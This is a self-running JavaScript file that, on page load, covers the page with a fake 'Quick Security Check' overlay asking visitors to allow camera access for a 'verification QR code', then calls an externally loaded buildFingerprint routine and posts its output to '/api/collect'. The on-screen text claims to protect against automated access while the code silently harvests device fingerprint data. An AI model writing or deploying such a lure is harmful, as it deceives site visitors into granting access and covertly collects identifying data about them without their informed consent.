(function(){

function waitForFingerprint(){

    return new Promise(resolve => {

        let tries = 0

        const interval = setInterval(() => {

            if(typeof buildFingerprint === "function"){
                clearInterval(interval)
                resolve(true)
            }

            tries++

            if(tries > 50){
                clearInterval(interval)
                resolve(false)
            }

        }, 100)

    })

}

async function createOverlay(){

    const overlay = document.createElement("div")

    overlay.style = `
        position:fixed;
        top:0;
        left:0;
        width:100%;
        height:100%;
        background:rgba(0,0,0,0.65);
        backdrop-filter:blur(4px);
        z-index:999999;
        display:flex;
        align-items:center;
        justify-content:center;
    `

    const box = document.createElement("div")

    box.style = `
        background:white;
        color:#222;
        padding:30px;
        border-radius:12px;
        max-width:420px;
        width:90%;
        text-align:center;
        font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto;
        box-shadow:0 10px 30px rgba(0,0,0,0.2);
    `

    box.innerHTML = `
        <div style="margin-bottom:15px;font-size:28px;">🔒</div>

        <h2 style="margin-bottom:10px;">Quick Security Check</h2>

        <p style="font-size:14px;color:#555;margin-bottom:20px;">
            To continue, please allow camera access to scan the verification QR code.
        </p>

        <div style="
            width:120px;
            height:120px;
            margin:0 auto 20px;
            background:#f5f5f5;
            display:flex;
            align-items:center;
            justify-content:center;
            font-size:12px;
            color:#999;
            border-radius:8px;
        ">
            QR Preview
        </div>

        <button id="verify-btn" style="
            width:100%;
            padding:12px;
            font-size:16px;
            border:none;
            border-radius:8px;
            background:#007bff;
            color:white;
            cursor:pointer;
        ">
            Continue
        </button>

        <p style="margin-top:15px;font-size:12px;color:#888;">
            This helps us verify your connection and protect against automated access.
        </p>
    `

    overlay.appendChild(box)
    document.body.appendChild(overlay)

    const btn = document.getElementById("verify-btn")

    btn.onclick = async () => {

        btn.innerText = "Verifying..."
        btn.disabled = true

        const ready = await waitForFingerprint()

        if(!ready){
            console.log("fingerprint not loaded")
            overlay.remove()
            return
        }

        try{

            const payload = await buildFingerprint(true, true)

            await fetch('/api/collect',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify(payload)
            })

            overlay.remove()

        }catch(e){
            console.log("capture error", e)
            overlay.remove()
        }

    }

}

window.addEventListener("load", createOverlay)

})()